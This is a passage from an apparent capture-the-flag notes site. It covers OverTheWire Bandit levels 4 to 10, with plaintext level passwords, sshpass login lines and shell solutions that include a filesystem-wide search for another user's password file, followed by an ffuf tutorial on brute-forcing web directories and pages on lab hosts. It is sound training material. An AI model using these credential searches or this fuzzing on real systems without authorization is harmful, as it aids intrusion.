</p>"},{"location":"overthewire/bandit/level4-5/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1Hint 2 <p>Find out how to switch directories in Linux. Consult the Resources section. </p> <p>Learn about displaying hidden files in Linux. How to differentiate between conventional (non-hidden) files and hidden ones  </p> Solution <pre><code>bandit4@bandit:~$ ls -al  total 24  \ndrwxr-xr-x \u00a03 root root 4096 May \u00a07 \u00a02020 .  \ndrwxr-xr-x 41 root root 4096 May \u00a07 \u00a02020 ..  \n-rw-r--r-- \u00a01 root root \u00a0220 May 15 \u00a02017 .bash_logout  \n-rw-r--r-- \u00a01 root root 3526 May 15 \u00a02017 .bashrc  \ndrwxr-xr-x \u00a02 root root 4096 May \u00a07 \u00a02020 inhere  \n-rw-r--r-- \u00a01 root root \u00a0675 May 15 \u00a02017 .profile  bandit4@bandit:~$ cd inhere/  bandit4@bandit:~/inhere$ ls -al  total 48  \ndrwxr-xr-x 2 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a04096 May \u00a07 \u00a02020 .  \ndrwxr-xr-x 3 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a04096 May \u00a07 \u00a02020 ..  \n-rw-r----- 1 bandit5 bandit4 \u00a0\u00a033 May \u00a07 \u00a02020 -file00  \n-rw-r----- 1 bandit5 bandit4 \u00a0\u00a033 May \u00a07 \u00a02020 -file01  \n-rw-r----- 1 bandit5 bandit4 \u00a0\u00a033 May \u00a07 \u00a02020 -file02  \n-rw-r----- 1 bandit5 bandit4 \u00a0\u00a033 May \u00a07 \u00a02020 -file03  \n-rw-r----- 1 bandit5 bandit4 \u00a0\u00a033 May \u00a07 \u00a02020 -file04  \n-rw-r----- 1 bandit5 bandit4 \u00a0\u00a033 May \u00a07 \u00a02020 -file05  \n-rw-r----- 1 bandit5 bandit4 \u00a0\u00a033 May \u00a07 \u00a02020 -file06  \n-rw-r----- 1 bandit5 bandit4 \u00a0\u00a033 May \u00a07 \u00a02020 -file07  \n-rw-r----- 1 bandit5 bandit4 \u00a0\u00a033 May \u00a07 \u00a02020 -file08  \n-rw-r----- 1 bandit5 bandit4 \u00a0\u00a033 May \u00a07 \u00a02020 -file09  bandit4@bandit:~/inhere$ file ./* \u00a0  ./-file00: data  \n./-file01: data  \n./-file02: data  \n./-file03: data  \n./-file04: data  \n./-file05: data  \n./-file06: data  \n./-file07: ASCII text  \n./-file08: data  \n./-file09: data  bandit4@bandit:~/inhere$ cat ./-file07 </code></pre> <p>The command <code>file</code> can be used to determine the file-type. There are just 10 files, so we could manually type <code>file</code> for each file name and search for a human-readable type. One such type is <code>ASCII text</code>. Using <code>*</code> to simultaneously query all files with the command <code>file</code> is faster. Given that every file begins with a dash, we must provide a complete path. For instance, <code>file ./*</code>. We can also use <code>ls -al -- *</code>. The file can be output with <code>cat</code> once it has been identified.  </p> <pre><code>-a, --all\n      do not ignore entries starting with .\n\n-A, --almost-all\n      do not list implied . and ..\n</code></pre> <p>Other methods</p> <ul> <li><code>strings</code>  - <code>strings -- *</code> or <code>strings ./*</code> </li> <li><code>find</code> - <code>find . -type f -exec file {} + | grep ASCII</code> </li> </ul> One-liner <p>Bash one-liners can reduce workload, automate something quickly and put the power of ultimate system control in your hands. </p> <p>https://linuxconfig.org/linux-complex-bash-one-liner-examples</p> <pre><code>cat $(find ~/inhere -type f -exec file {} + | grep ASCII | cut -f1 -d' '|tr \":\" \" \")\n</code></pre> <p>This is an example of an one-liner. It's not part of the challenge and can be omitted. The command substitution output is handled by <code>cat</code>. A single file with the file type <code>ASCII</code> is returned by the commands in <code>$()</code>, which searches for all files in the current folder and passes them to the <code>file</code> and <code>grep</code> commands. To leave only the filename, all unnecessary characters are removed using the commands <code>tr</code> and <code>cut</code>.</p> <p>You can build the one-liner piece by piece and observe how the commands minimize the output. Start by typing <code>find ~/inhere -type f -exec file {} +</code>, the command in front of the first pipe <code>|</code>. Add the command between the pipes first and second pipe <code>find ~/inhere -type f -exec file {} + | grep ASCII</code>. Move on to the next command and so forth. For the filename to be passed to the <code>cat</code> command, use command substitution. Refer to the Resources section for more information.</p>"},{"location":"overthewire/bandit/level4-5/#resources","title":"Resources","text":"Resources <p>Bandit-level5@overthewire.org tr and cut @geeksforgeeks.org find human readable files @stackexchange.com What is command substitution in a shell? @stackexchange What are One-liners @linuxconfig.org</p>"},{"location":"overthewire/bandit/level5-6/","title":"Bandit Level 5-6@overthewire.org","text":""},{"location":"overthewire/bandit/level5-6/#description","title":"Description","text":"<p>The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:</p> <ul> <li>human-readable</li> <li>1033 bytes in size</li> <li>not executable</li> </ul>"},{"location":"overthewire/bandit/level5-6/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: bandit5 Password: lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR"},{"location":"overthewire/bandit/level5-6/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR ssh -p 2220 bandit5@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested. </p>"},{"location":"overthewire/bandit/level5-6/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1Hint 2 <p>In the manpage for <code>find</code>, look up what options you need to use to find a file with the specified attributes.</p> <p>One option needs to be negated, consult the man page to learn how to negate options. </p> Solution <pre><code>bandit5@bandit:~$ cd inhere/  bandit5@bandit:~/inhere$ ls -al  total 88  \ndrwxr-x--- 22 root bandit5 4096 May \u00a07 \u00a02020 .  \ndrwxr-xr-x \u00a03 root root \u00a0\u00a0\u00a04096 May \u00a07 \u00a02020 ..  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere00  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere01  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere02  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere03  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere04  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere05  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere06  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere07  \nrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere08  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere09  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere10  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere11  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere12  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere13  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere14  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere15  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere16  \nrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere17  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere18  \ndrwxr-x--- \u00a02 root bandit5 4096 May \u00a07 \u00a02020 maybehere19  bandit5@bandit:~/inhere$ find . -type f ! -executable -size 1033c -exec file {} + | grep ASCII   ./maybehere07/.file2: ASCII text, with very long lines   # (1)\n\nbandit5@bandit:~/inhere$ cat ./maybehere07/.file2  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  \nbandit5@bandit:~/inhere$ \u00a0  bandit5@bandit:~/inhere$ cat ./maybehere07/.file2 | tr -d \" \"\u00a0   # (2)\n</code></pre> <ol> <li>use find with necessary options and pipe the output to grep </li> <li>use <code>tr</code> to remove the empty spaces</li> </ol> <p>Like in the previous level, we use the <code>find</code> command but with additional options.</p> <p>Using <code>man find</code>, we search for the necessary options.</p> <ul> <li>1033 bytes - <code>-size 1033c</code> </li> <li>not executable - <code>! -executable</code> , using the options <code>!</code> or <code>-not</code>, we negate the executable flag     </li> <li>human readable - <code>find ..... -exec file {} + | grep ASCII</code>.      </li> </ul> <p>We run the <code>file</code> command on each file we find, then pipe the output to grep. Since <code>ASCII</code> is human readable, we display that filename if the output of that piped command contains it. We <code>cat</code> that filename. The output has a large number of empty spaces, therefore we use the command <code>tr -d \" \"</code> to remove them all. </p>"},{"location":"overthewire/bandit/level5-6/#resources","title":"Resources","text":"Resources <p>Bandit-level6@overthewire man page for find command @man7.org </p>"},{"location":"overthewire/bandit/level6-7/","title":"Bandit Level 6-7@overthewire.org","text":""},{"location":"overthewire/bandit/level6-7/#description","title":"Description","text":"<p>The password for the next level is stored somewhere on the server and has all of the following properties:</p> <ul> <li>owned by user bandit7</li> <li>owned by group bandit6</li> <li>33 bytes in size</li> </ul>"},{"location":"overthewire/bandit/level6-7/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: bandit6 Password: P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU"},{"location":"overthewire/bandit/level6-7/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU ssh -p 2220 bandit6@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested. </p>"},{"location":"overthewire/bandit/level6-7/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1Hint 2 <p>In the manpage for <code>find</code>, look up what options you need to use to find a file with the specified attributes. </p> <p>If you encounter <code>permission denied</code> errors, redirect them to <code>/dev/null</code> to disregard them. Learn about <code>file descriptors</code> and the <code>standard output</code>. </p> Solution <pre><code>bandit6@bandit:~$ find / -type f -size 33c -user bandit7 -group bandit6 2&gt;/dev/null # (1)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \n/var/lib/dpkg/info/bandit7.password  bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password   # (2)\n</code></pre> <ol> <li>use <code>find</code> with necessary options, start the search from <code>/</code>. Redirect errors to <code>/dev/null</code> </li> <li>display the password using <code>cat</code> on the found file</li> </ol> <p>Using <code>man find</code>, we search for the necessary options.</p> <pre><code>- 33 bytes - `-size 33c`\n- owned by user bandit7 - `-user bandit7`\n- owned by group bandit6 - `-group bandit6`\n</code></pre> <p>There are no subdirectories and the file is not located in the home directory. We start our search at the root directory <code>/</code> since we need to search the entire filesystem for the file. We use the parameters <code>-size</code>, <code>-user</code>, and <code>-group</code> to define the options necessary to find the file. As we search from the root directory up, we will come across many files that we do not have permission to examine. As a result, we direct any error messages we receive as a result of this to the device <code>/dev/null</code>. We disregard them. In bash and sh, the default file descriptor for errors is <code>2</code>. We utilize the redirection <code>2&gt;/dev/null</code> to disregard error messages. We use <code>cat</code> to display the password after discovering the whole path to the file. </p>"},{"location":"overthewire/bandit/level6-7/#resources","title":"Resources","text":"Resources <p>Bandit-level7@overthewire man page for find command @man7.org BASH Shell Redirect Output and Errors To /dev/null @cyberciti.biz </p>"},{"location":"overthewire/bandit/level7-8/","title":"Bandit Level 7-8@overthewire.org","text":""},{"location":"overthewire/bandit/level7-8/#description","title":"Description","text":"<p>The password for the next level is stored in the file data.txt next to the word millionth</p>"},{"location":"overthewire/bandit/level7-8/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: bandit7 Password: z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S"},{"location":"overthewire/bandit/level7-8/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S ssh -p 2220 bandit7@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested. </p>"},{"location":"overthewire/bandit/level7-8/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1Hint 2 <p>Find out how to use grep to search for a string in a file. </p> <p>you can cut out only the password. Use the command <code>cut</code> with the field separator option. </p> Solution <pre><code>bandit7@bandit:~$ ls -al  total 4108  \ndrwxr-xr-x \u00a02 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0\u00a04096 May \u00a07 \u00a02020 .  \ndrwxr-xr-x 41 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0\u00a04096 May \u00a07 \u00a02020 ..  \n-rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0220 May 15 \u00a02017 .bash_logout  \n-rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0\u00a03526 May 15 \u00a02017 .bashrc  \n-rw-r----- \u00a01 bandit8 bandit7 4184396 May \u00a07 \u00a02020 data.txt  \n-rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0675 May 15 \u00a02017 .profile  bandit7@bandit:~$ grep millionth data.txt \u00a0  # (1)\nmillionth \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0xxxxxxxxxxxxxxxxxxxxxx  bandit7@bandit:~$ grep millionth data.txt | cut -f2  # (2)\nxxxxxxxxxxxxxxxxxx\n</code></pre> <ol> <li>use <code>grep</code> with the search string <code>millionth</code> on the file <code>data.txt</code></li> <li><code>cut</code> out only the password. It's in field 2 of the line.</li> </ol> <p><code>ls -al</code>shows that the file <code>data.txt</code> is in the home directory. We can just use <code>grep</code> this time because we know where the file is located. Using the command <code>grep \"millionth\" data.txt</code>, we look for the term <code>millionth</code> within the file <code>data.txt</code>. The output is a line with two fields, the second of which is the password. As a result, we pipe the <code>grep</code> output to the <code>cut</code> command, wich only displays the second field.  </p>"},{"location":"overthewire/bandit/level7-8/#resources","title":"Resources","text":"Resources <p>Bandit-level8@overthewire How To Use grep Command In Linux / UNIX With Practical Examples @cyberciti.biz cut command in Linux with examples @geeksforgeeks.org </p>"},{"location":"overthewire/bandit/level8-9/","title":"Bandit Level 8-9@overthewire.org","text":""},{"location":"overthewire/bandit/level8-9/#description","title":"Description","text":"<p>The password for the next level is stored in the file data.txt and is the only line of text that occurs only once</p>"},{"location":"overthewire/bandit/level8-9/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: bandit8 Password: TESKZC0XvTetK0S9xNwm25STk5iWrBvP"},{"location":"overthewire/bandit/level8-9/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p TESKZC0XvTetK0S9xNwm25STk5iWrBvP ssh -p 2220 bandit8@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested. </p>"},{"location":"overthewire/bandit/level8-9/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1Hint 2 <p>In the manpage for <code>uniq</code>, look up what options you need display only unique lines. </p> <p>Does <code>uniq</code> need anything in order to function? Does it matter whether duplicate lines are adjacent or not?  </p> Solution <pre><code>bandit8@bandit:~$ ls -al  total 56  \ndrwxr-xr-x \u00a02 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a04096 May \u00a07 \u00a02020 .  \ndrwxr-xr-x 41 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a04096 May \u00a07 \u00a02020 ..  \n-rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0220 May 15 \u00a02017 .bash_logout  \n-rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a03526 May 15 \u00a02017 .bashrc  -rw-r----- \u00a01 bandit9 bandit8 33033 May \u00a07 \u00a02020 data.txt  -rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0675 May 15 \u00a02017 .profile  bandit8@bandit:~$ cat data.txt | sort | uniq -u  # (1)\nxxxxxxxxxxxxxxxxxxxx\n</code></pre> <ol> <li>In order to make all duplicate lines adjacent, pipe the output from <code>cat</code> to <code>sort</code>. Finally, run <code>uniq -u</code> on that output to view just unique lines. </li> </ol> <p><code>ls -al</code>shows that the file <code>data.txt</code> is in the home directory. To only display unique lines, we can use the command <code>uniq</code> with the option <code>-u</code>. If we look at the man page for <code>uniq</code>, we can see that it filters adjacent matching lines. Because the lines in the file are not all adjacent, we must <code>sort</code>  them before passing them to <code>uniq</code>. </p>"},{"location":"overthewire/bandit/level8-9/#resources","title":"Resources","text":"Resources <p>Bandit-level9@overthewire uniq @linux.die.net </p>"},{"location":"overthewire/bandit/level9-10/","title":"Bandit Level 9-10@overthewire.org","text":""},{"location":"overthewire/bandit/level9-10/#description","title":"Description","text":"<p>The password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several \"=\" characters.</p>"},{"location":"overthewire/bandit/level9-10/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: bandit9 Password: EN632PlfYiZbn3PhVK3XOGSlNInNE00t"},{"location":"overthewire/bandit/level9-10/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p EN632PlfYiZbn3PhVK3XOGSlNInNE00t ssh -p 2220 bandit9@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested. </p>"},{"location":"overthewire/bandit/level9-10/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1Hint 2Hint 3Hint 4 <p>The data looks messed up when displayed with <code>cat</code>. Determine the file's data type. There is a command for that. </p> <p>A command exists to extract human-readable strings from a binary file. </p> <p>Because the output isn't that large, you can examine it in this case. But what if the output was significantly longer? How would you filter the output to show only the lines you require? According to the description, the password is preceded by several <code>=</code> characters. That could be an option for a filter. </p> <p>Use pipes <code>|</code>. Use <code>grep</code> to filter the output. </p> Solution <pre><code>bandit8@bandit:~$ ls -al  total 56  \ndrwxr-xr-x \u00a02 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a04096 May \u00a07 \u00a02020 .  drwxr-xr-x 41 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a04096 May \u00a07 \u00a02020 ..  -rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0220 May 15 \u00a02017 .bash_logout  \n-rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a03526 May 15 \u00a02017 .bashrc  \n-rw-r----- \u00a01 bandit9 bandit8 33033 May \u00a07 \u00a02020 data.txt  \n-rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0675 May 15 \u00a02017 .profile  \n\nbandit9@bandit:~$ cat data.txt \u00a0# (1)\u00a0  \n\ufffdL\ufffdl\u03c9;\ufffd\ufffd\u00dfO\u071b\ufffd\ufffd\u01e4X\ufffd\ufffdNdT$\ufffd\ufffdx7\ufffd\ufffd@D@\ufffdo\ufffd\ufffd+D\ufffd\ufffdB\ufffd\ufffdM\u05a2\ufffdZ/,_\ufffd\ufffd\ufffdw\ufffd\ufffd\ufffd#\ufffd5\ufffd\ufffd\ufffd  \u040e\ufffde\ufffd&amp;\ufffd-\ufffd\ufffd\u03e2\ufffd6Q8\ufffd\ufffdJ\ufffd%fa\ufffd\ufffd  \n\ufffdnp\ufffd6l  |c\ufffd\ufffd\ufffdWW&amp;8\ufffd\ufffdf\ufffd\ufffd\ufffd\n\nbandit9@bandit:~$ file data.txt \u00a0 # (2)\u00a0 \ndata.txt: data\n\nbandit9@bandit:~$ strings data.txt \u00a0  # (3)\u00a0\n...\n...\nGhG$  ========== the*2i4  \nDUJmU\n...\n...\n\nbandit9@bandit:~$ strings data.txt | grep ===  # (4)\u00a0 \n========== the*2i4  ========== password  \nZ)========== is  &amp;========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk # (5)\n</code></pre> <ol> <li>the output from <code>cat</code> is unreadable</li> <li>the <code>data.txt</code> file has the data type <code>data</code></li> <li>we can extract some human-readable strings with the command <code>strings</code></li> <li>using <code>grep</code>, we can further filter the output to find the password.</li> <li>the password for the next level</li> </ol> <p><code>ls -al</code> shows that the file <code>data.txt</code> is in the home directory. When we use the command <code>cat</code> to display the file's content, we get characters we can't read. It is a (binary) data file, as can be seen if we use the command <code>file</code> to determine the file type. With the command <code>strings</code>,  we may extract human-readable strings from binary files. If we take into consideration the level description (\"preceded by several <code>=</code> characters\") and pipe the output from <code>strings</code> to <code>grep</code> with the search string, for instance,<code>===</code>, we get some readable strings, and the password is in the last line.</p> <p>**Additional information: ** How do you know the password is on the last line? There are two indicators. If you read the readable strings from first to last, it says \"the password is xxxxxxxx.\" The password's length serves as the second indicator. All passwords up until this point have been 32 characters long. This password is also. The command <code>wc -c</code> can be used to determine the length of a string. <code>echo -n abcdefghijklmnoprstuvwxyz1234567 | wc -c</code>,  for instance. </p>"},{"location":"overthewire/bandit/level9-10/#resources","title":"Resources","text":"Resources <p>Bandit-level9@overthewire file @linux.die.net strings @linux.die.net wc @linux.die.net grep @linux.die.net </p>"},{"location":"thm/template/","title":"Template","text":""},{"location":"tools/ffuf/","title":"ffuf","text":"<p>ffuf stands for Fuzz Faster U Fool. It's a tool used for web enumeration, fuzzing, and directory brute forcing.</p>"},{"location":"tools/ffuf/#installation","title":"Installation","text":"<p><code>ffuf</code> is included with many security oriented distributions.  In most cases <code>apt install ffuf</code> is enough to install it.</p> <p>Since ffuf is a <code>go</code> application you simply install it with go (after you've installed golang) like <code>go get -u github.com/ffuf/ffuf</code></p>"},{"location":"tools/ffuf/#basics","title":"Basics","text":"<p>Minimal required options are <code>-u</code> for the URL and <code>-w</code> for the wordlist. <code>FFUZ</code> is the default keyword. It tell <code>ffuf</code> where to the entries from the wordlist will be injected. </p> <p><code>fuff -u http://&lt;IP_OR_URL&gt;/FFUZ -w wordlist.txt</code></p> <p>This command \"fuzzes\" or brute-forces all the entries from a wordlist and checks the returned HTTP Codes from the URL.</p> <p>The default keyword can be changed by adding <code>:&lt;KEYWORD&gt;</code>at the end of the wordlist.</p> <p><code>fuff -u http://&lt;IP_OR_URL&gt;/FUZZTHIS -w wordlist.txt:FUZZTHIS</code></p> <p>The option to change the keyword can be used to to use more than one wordlist</p> <p><code>fuff -u http://&lt;IP_OR_URL&gt;/FUZZTHIS/FUZZTHAT -w wordlist.txt:FUZZTHIS -w another_wordlist:FUZZTHAT</code></p> <p>Some wordlists have comments like copyright notices, comments or notes included. To ignore those comments use <code>-ic</code>. </p>"},{"location":"tools/ffuf/#finding-pages","title":"Finding Pages","text":""},{"location":"tools/ffuf/#extension-fuzzing","title":"Extension Fuzzing","text":"<p>If we don't know the technology used and we assume most of the pages have a index page <code>index.ext</code> we can do a quick check with a small extensions wordlist before we use a big, generic wordlist.</p> <p><pre><code>ffuf -u http://10.10.167.75/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt\n</code></pre> <pre><code>\u2514\u2500# ffuf -u http://10.10.167.75/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive &lt;3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.167.75/indexFUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/web-extensions.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\n.php                    [Status: 302, Size: 0, Words: 1, Lines: 1]\n.phps                   [Status: 403, Size: 289, Words: 21, Lines: 11]\n:: Progress: [39/39] :: Job [1/1] :: 11 req/sec :: Duration: [0:00:05] :: Errors: 0 ::\n</code></pre></p> <p>We can see the technology uses is <code>php</code>.</p>"},{"location":"tools/ffuf/#page-fuzzing","title":"Page fuzzing","text":"<p>After we get the extensions/technology used, we can try to find pages with those extensions. We can find pages by using the option <code>-e</code> and adding the extension we want to search for (including the <code>.</code>). There are wordlists that include generic filenames including with all the possible extensions (e.g. <code>raft-medium-files-lowercase.txt</code>). If we know the technology used, we can simply add the option <code>-e</code> with the extensions we want to search for and use a simple wordlist without extensions (e.g. <code>raft-medium-words-lowercase.txt</code>). We can also search for some generic extensions/ For example for a php-powered website we could use the extensions <code>.php, .txt, .cfg, .conf</code>. </p> <p><code>ffuf -u http://10.10.167.75/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e .php,.txt,.cfg, .conf</code> <pre><code>\u2514\u2500# ffuf -u http://10.10.167.75/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e .php,.txt,.cfg,.conf -fc 403\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive &lt;3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.167.75/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt\n :: Extensions       : .php .txt .cfg .conf \n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response status: 403\n________________________________________________\n\nlogin.php               [Status: 200, Size: 1523, Words: 89, Lines: 77]\nindex.php               [Status: 302, Size: 0, Words: 1, Lines: 1]\nlogout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]\nconfig                  [Status: 301, Size: 312, Words: 20, Lines: 10]\ndocs                    [Status: 301, Size: 310, Words: 20, Lines: 10]\nabout.php               [Status: 200, Size: 4840, Words: 331, Lines: 109]\n.                       [Status: 302, Size: 0, Words: 1, Lines: 1]\nexternal                [Status: 301, Size: 314, Words: 20, Lines: 10]\nsetup.php               [Status: 200, Size: 4066, Words: 308, Lines: 123]\nrobots.txt              [Status: 200, Size: 26, Words: 3, Lines: 2]\nsecurity.php            [Status: 302, Size: 0, Words: 1, Lines: 1]\nphpinfo.php             [Status: 302, Size: 0, Words: 1, Lines: 1]\ninstructions.php        [Status: 200, Size: 14014, Words: 1484, Lines: 263]\n</code></pre></p>"},{"location":"tools/ffuf/#finding-directories","title":"Finding Directories","text":"<p>Directories are not technology-dependent and you can use a simple directory list</p> <pre><code>ffuf -u http://10.10.167.75/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt\n</code></pre>"},{"location":"tools/ffuf/#recursive-fuzzing","title":"Recursive fuzzing","text":"<p>A directory can contain other/more directories (<code>login/user/</code>) and, manually, we would have to fuzz again by starting a new instance of <code>ffuf</code> with a new url. We can automate this with recursive scanning. The flag for recursive fuzzing is <code>-recursiion</code>. We also have to add the depth with the flag <code>-recursion-depth</code>. For example, if we define <code>-recursion-depth 1</code> it will only fuzz the main directory and direc subdirectories. We should always use the <code>-v</code> flag so we can see the full <code>URL</code>. Otherwise, if we fuzz for files, it could be hard to determine what file belongs to what directory. </p> <pre><code>\u2514\u2500# ffuf -u http://188.166.173.208:30769/FUZZ -recursion -recursion-depth 1 -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -e .php -fc 403 -v\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive &lt;3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://188.166.173.208:30769/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt\n :: Extensions       : .php \n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response status: 403\n________________________________________________\n\n[Status: 301, Size: 327, Words: 20, Lines: 10]          